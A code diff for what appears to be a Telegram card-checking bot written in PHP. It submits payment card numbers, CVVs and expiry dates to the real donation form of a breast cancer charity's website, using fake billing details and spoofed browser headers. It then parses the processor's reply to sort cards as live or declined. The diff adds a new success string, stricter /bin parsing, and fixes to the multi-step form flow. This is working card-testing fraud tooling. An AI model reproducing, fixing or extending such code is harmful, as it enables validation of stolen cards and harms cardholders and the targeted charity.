@@ -321,6 +321,7 @@ $live_array = array(
     '"status": "succeeded"',
     'Rejected: avs',
     'Your payment has already been processed',
+    'Your contribution has been submitted to Credit Card for processing',
     'Nice! New payment method added',
     'Approved',
     'Charged $5',
@@ -1138,6 +1139,33 @@ editMessage($chat_id,$respuesta,$id_text);
 
 
 elseif((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)||(strpos($message, ".bin") === 0)){
+
+
+$tr = explode(" ", $message);
+$comando = ltrim($tr[0], "/.!");
+
+if ($comando == "bin" && count($tr) > 1) {
+    $numero = $tr[1];
+    $primeros6 = substr($numero, 0, 6);
+    if (strlen($primeros6) == 6 && ctype_digit($primeros6)) {
+        $bin = $primeros6;
+        // Código a ejecutar cuando se proporcione un número de 6 dígitos
+ //       echo "Bin: $bin";
+    } else {
+//        echo "Error: Debes proporcionar un número de 6 dígitos después del comando /bin";
+	    $respuesta = "🚫 Oops!\nUse this format: /bin xxxxxx\n";
+	    sendMessage($chat_id,$respuesta,$message_id);
+	    die();
+    }
+} else {
+     $respuesta = "🚫 Oops!\nUse this format: /bin xxxxxx\n";
+     sendMessage($chat_id,$respuesta,$message_id);
+     die();
+    //echo "Error: Comando no válido o no se proporcionó un número de 6 dígitos";
+}
+
+
+/*
 $tr = explode(" ", $message);
 $comando = ltrim($tr[0], "/.!"); // elimina /, . o ! del inicio del comando
 if (count($tr) > 1) {
@@ -1153,6 +1181,10 @@ if (count($tr) > 1) {
 	    die();
     }
 }
+*/
+
+
+
 
 //----------------MENSAGE DE ESPERA-------------------//
 $respuesta = "<b>🕒 Wait for Result...</b>";
@@ -2895,6 +2927,7 @@ $brand = "Unavailable";
 $MV = ucwords(strtolower(trim($brand)));
 echo "$MV\n";
 
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://breastcancereducation.org/make-a-donation',
@@ -2932,10 +2965,9 @@ $qfKey = $coincidencias_qfKey[1];
 $MAX_FILE_SIZE = $coincidencias_MAX_FILE_SIZE[1];
 curl_close($curl);
 
-/*echo "qfKey: $qfKey\n";
+echo "qfKey: $qfKey\n";
 echo "MAX_FILE_SIZE: $MAX_FILE_SIZE\n";
 echo "-------------------------------\n";
-*/
 
 $curl = curl_init();
 curl_setopt_array($curl, [
@@ -2948,6 +2980,7 @@ curl_setopt_array($curl, [
   CURLOPT_CUSTOMREQUEST => 'POST',
   CURLOPT_POSTFIELDS => [
     'qfKey' => ''.$qfKey.'',
+    'entryURL' => 'https://breastcancereducation.org/civicrm/contribute/transact?reset=1&amp;id=1',
     'MAX_FILE_SIZE' => ''.$MAX_FILE_SIZE.'',
     'hidden_processor' => '1',
     'payment_processor_id' => '3',
@@ -2969,7 +3002,7 @@ curl_setopt_array($curl, [
     'custom_30' => '',
     'credit_card_type' => ''.$MV.'',
     'credit_card_number' => ''.$cc.'',
-    'cvv2' => $cvv,
+    'cvv2' => ''.$cvv.'',
     'credit_card_exp_date[M]' => ''.$mes.'',
     'credit_card_exp_date[Y]' => ''.$ano.'',
     'billing_first_name' => 'Carlos',
@@ -2978,29 +3011,29 @@ curl_setopt_array($curl, [
     'billing_street_address-5' => '6195 bollinger rd',
     'billing_city-5' => 'New york',
     'billing_country_id-5' => '1228',
-    'billing_state_province_id-5' => '1058',
+    'billing_state_province_id-5' => '1002',
     'billing_postal_code-5' => '10010',
     '_qf_Main_upload' => '1',
   ],
 //  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
-    CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
-    CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',                                                                                       
-    CURLOPT_HTTPHEADER => [
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+  CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'cache-control: max-age=0',
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
     'origin: https://breastcancereducation.org',
-            //    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryf5wcYWFVprKL61RK',
+//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryWAA2TGiEXXBLDzQk',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.6',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
     'sec-fetch-dest: document',
-    'referer: https://breastcancereducation.org/make-a-donation',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?reset=1&id=1',
     'priority: u=0, i',
   ],
 ]);
@@ -3008,9 +3041,6 @@ curl_setopt_array($curl, [
 $response = curl_exec($curl);
 $err = curl_error($curl);
 curl_close($curl);
-
-
-
 
 
 $curl = curl_init();
@@ -3022,15 +3052,15 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'cache-control: max-age=0',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.6',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
@@ -3038,7 +3068,7 @@ curl_setopt_array($curl, [
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://breastcancereducation.org/make-a-donation',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?reset=1&id=1',
     'priority: u=0, i',
   ],
 ]);
@@ -3052,7 +3082,6 @@ echo "qfKey: $qfKey2\n";
 curl_close($curl);
 
 
-
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact',
@@ -3062,7 +3091,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&_qf_default=Confirm%3Anext&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
+  CURLOPT_POSTFIELDS => 'qfKey='.$qfKey2.'&entryURL=https%3A%2F%2Fbreastcancereducation.org%2Fcivicrm%2Fcontribute%2Ftransact%3Freset%3D1%26amp%3Bid%3D1&_qf_default=Confirm%3Anext&_qf_Confirm_next=1&custom_28=&custom_29=&custom_31=&custom_30=',
 //  CURLOPT_COOKIE => 'SSESSa89325c1b7511fff913d4e74fb9e1eb9=B438Tp5l0XvWfjf46Ood0vja-Uzyc_nIyGpixIR65cg',
   CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
@@ -3076,12 +3105,12 @@ curl_setopt_array($curl, [
     'origin: https://breastcancereducation.org',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.6',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
     'sec-fetch-dest: document',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey.'',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
     'priority: u=0, i',
   ],
 ]);
@@ -3094,7 +3123,7 @@ curl_close($curl);
 
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_Main_display=true&qfKey='.$qfKey2.'',
+  CURLOPT_URL => 'https://breastcancereducation.org/civicrm/contribute/transact?_qf_ThankYou_display=true&qfKey='.$qfKey2.'',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
@@ -3109,7 +3138,7 @@ curl_setopt_array($curl, [
     'cache-control: max-age=0',
     'upgrade-insecure-requests: 1',
     'sec-gpc: 1',
-    'accept-language: es-US,es;q=0.7',
+    'accept-language: es-US,es;q=0.6',
     'sec-fetch-site: same-origin',
     'sec-fetch-mode: navigate',
     'sec-fetch-user: ?1',
@@ -3117,31 +3146,43 @@ curl_setopt_array($curl, [
     'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
     'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfkey2.'',
+    'referer: https://breastcancereducation.org/civicrm/contribute/transact?_qf_Confirm_display=true&qfKey='.$qfKey2.'',
     'priority: u=0, i',
   ],
 ]);
 
+
 $response = curl_exec($curl);
 file_put_contents('index.html', $response);
+//$response = file_get_contents('index.html');
 $err = curl_error($curl);
 
 $patron = '/<span class="msg-text">(.*?)<\/span>/';
 preg_match($patron, $response, $coincidencias);
 $mensaje1 = $coincidencias[1];
+echo "Me1: $mensaje1\n";
 
 if (!empty($mensaje1)){
-
 $patron = '/Payment Processor Error message :\d*\s*(.*)/';
 preg_match($patron, $mensaje1, $coincidencias);
 $mensaje = trim($coincidencias[1]);
+echo "Me2: $mensaje\n";
 
 } else {
 $patron = '/<li>(.*?)<\/li>/';
 preg_match($patron, $response, $coincidencias);
 $mensaje = $coincidencias[1];
+echo "Me3: $mensaje\n";
+}
+
+if (empty($mensaje)){
+preg_match('/Your contribution has been submitted to Credit Card for processing/', $response, $match);
+$mensaje =  $match[0];
+echo "Me5: $mensaje\n";
 }
 //echo "Mensaje: $mensaje\n";
+
+
 
 $respo = $mensaje;
 	
